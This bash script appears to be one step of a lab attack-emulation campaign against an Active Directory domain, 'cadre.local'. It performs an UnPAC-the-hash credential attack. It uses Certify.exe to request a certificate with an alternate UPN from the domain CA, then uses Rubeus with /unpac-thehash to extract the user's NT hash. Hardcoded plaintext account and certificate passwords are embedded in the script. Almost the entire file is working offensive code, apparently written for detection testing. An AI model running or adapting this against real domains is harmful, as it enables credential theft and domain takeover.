#!/usr/bin/env bash
# T053 — UnPAC-the-hash from ws01 as chief_command (cadre.local DA)
# Requests a cert with UPN for target user, then Rubeus /unpac-the-hash.
# Entry credential: chief_command (earned via Branch A T015 ForceChangePassword)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T053-UNPAC-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T053 UnPAC-the-hash | ${CASE_ID} | T0=${T0} ==="

DC01="${DC01:-dc01.cadre.local}"
CA="${CA:-CADRE-CA-01.cadre.local\CADRE-CA-01}"
TARGET_USER="chief_command"

CMD='
$ErrorActionPreference = "Stop";
$c = "C:\Tools\cadre-attack\Certify.exe";
$r = "C:\Tools\cadre-attack\Rubeus.exe";
if (-not (Test-Path $c)) { throw "Certify.exe not found" }
if (-not (Test-Path $r)) { throw "Rubeus.exe not found" }
$cert = "C:\Users\chief_command\AppData\Local\Temp\cert.pfx";
& $c request /ca:"'''"${CA}"'''" /template:User /domain:"cadre.local" /dc:"'''"${DC01}"'''" /altname:"'''"${TARGET_USER}"'''" /out:$cert;
if (-not (Test-Path $cert)) { throw "cert.pfx not created" }
& $r asktgt /user:"'''"${TARGET_USER}"'''" /domain:cadre.local /dc:"'''"${DC01}"'''" /certificate:$cert /password:CertPass123 /unpac-thehash /nowrap;
Write-Output "T053_OK: UnPAC-the-hash attempt complete"
'

ws01_exec_as chief_command 'C0mm@nd_Ch1ef!' "$CMD" 'cadre.local'

cadre_export "${CASE_ID}" T053 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T053 run complete ==="
